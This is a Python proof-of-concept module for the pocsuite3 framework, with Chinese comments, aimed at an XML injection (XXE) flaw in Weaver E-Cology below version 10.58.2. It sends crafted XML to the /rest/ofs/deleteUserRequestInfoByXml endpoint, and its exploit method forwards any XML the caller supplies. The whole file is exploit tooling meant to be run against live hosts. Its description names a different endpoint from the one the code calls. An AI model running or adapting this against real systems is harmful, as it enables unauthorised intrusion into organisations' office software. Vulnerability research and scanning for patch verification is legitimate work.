#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    POC_CATEGORY, )

minimum_version_required('2.0.4')


class DemoPOC(POCBase):
    vulID = '99720'  # Seebug 漏洞收录 ID，如果没有则为 0
    version = '1'  # PoC 的版本，默认为 1
    author = 'zhizhuo'  # PoC 的作者
    vulDate = '2023-07-13'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2023-10-16'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2023-10-16'  # PoC 更新日期 (%Y-%m-%d)
    # 漏洞来源地址，0day 不用写
    references = ['https://www.seebug.org/vuldb/ssvid-99720']
    # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    name = '泛微 E-Cology XXE (QVD-2023-16177)'
    appPowerLink = 'https://www.weaver.com.cn/'  # 漏洞厂商主页地址
    appName = 'E-Cology'  # 漏洞应用名称
    appVersion = '<10.58.2'  # 漏洞影响版本
    vulType = 'XML Injection'  # 漏洞类型，参见漏洞类型规范表
    desc = '/rest/ofs/ReceiveCCRequestByXml接口存在XML Injection'  # 漏洞简要描述
    samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = ''' poc的用法描述 '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类
    protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化
    # protocol_default_port = 8443  # 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化
    # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
    # dork = {'zoomeye': 'deviceState.admin.hostname'}
    # suricata_request = '''http.uri; content: "/rest/ofs/ReceiveCCRequestByXml";'''  # 请求流量 suricata 规则
    # suricata_response = ''  # 响应流量 suricata 规则
    hasexp = True  # 是否有EXP
    Level = 2  # 漏洞危害等级，0低危 1中危害 2高危 3严重
    device_name = 'E-Cology'

    def _exploit(self, param=''):
        if not self._check(dork=''):
            return False
        headers = {'Content-Type': 'application/xml'}
        payload = param
        res = requests.post(self.url + "/rest/ofs/deleteUserRequestInfoByXml", headers=headers, data=payload)
        logger.debug(res.text)
        return res

    def _verify(self):
        result = {}
        req_list = list()
        random_num = tools.get_random_num(3)
        param = f"""<?xml version="1.0" encoding="utf-8"?>
                    <M><syscode>{random_num}</syscode></M>
                """
        res = self._exploit(param)
        req_list.append(tools.get_all_requests(res))
        if res.status_code == 200 and str(random_num) in res.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result["request"] = req_list
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
